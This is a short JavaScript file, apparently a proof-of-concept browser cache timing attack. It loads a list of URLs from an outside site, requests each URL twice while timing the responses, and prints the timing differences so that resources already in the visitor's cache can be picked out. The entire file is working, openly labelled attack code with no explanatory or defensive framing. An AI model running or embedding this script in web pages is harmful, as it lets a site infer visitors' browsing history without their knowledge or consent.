function ajaxRequest(){
 var activexmodes=["Msxml2.XMLHTTP", "Microsoft.XMLHTTP"] //activeX versions to check for in IE
 if (window.ActiveXObject){ //Test for support for ActiveXObject in IE first (as XMLHttpRequest in IE7 is broken)
  for (var i=0; i<activexmodes.length; i++){
   try{
    return new ActiveXObject(activexmodes[i])
   }
   catch(e){
    //suppress error
   }
  }
 }
 else if (window.XMLHttpRequest) // if Mozilla, Safari etc
  return new XMLHttpRequest()
 else
  return false
}

/*parser*/

url_loader = function(text_url){
	this.url_list = new Array();
	var raw_list = new ajaxRequest();
	raw_list.open("GET", text_url, false);
	raw_list.send(null);
	var resp_list = raw_list.responseText;
	var split_list = resp_list.split(',');
	for (var index in split_list){
		this.url_list.push(split_list[index]);
	}
}


/*timing attack*/


	var loader = new url_loader("http://www.joeygolden.com/WT/imagelist.txt");
	var blind_run = new Array();
	var cache_run = new Array();
	
	for (var index in loader.url_list){
		var run_request = new ajaxRequest();
		var timer1 = new Date();
		var start_time = timer1.getTime();
		run_request.open("GET", (loader.url_list[index]), false);
		run_request.send(null);
		var timer2 = new Date();
		var end_time = timer2.getTime();
		var difference = end_time - start_time;
		blind_run.push(difference);
	}
	for (var index in loader.url_list){
		var run_request = new ajaxRequest();
		var timer1 = new Date();
		var start_time = timer1.getTime();
		run_request.open("GET", (loader.url_list[index]), false);
		run_request.send(null);
		var timer2 = new Date();
		var end_time = timer2.getTime();
		var difference = end_time - start_time;
		cache_run.push(difference);
	}
	for (var index in blind_run){
		document.writeln(blind_run[index]-cache_run[index]);
	}

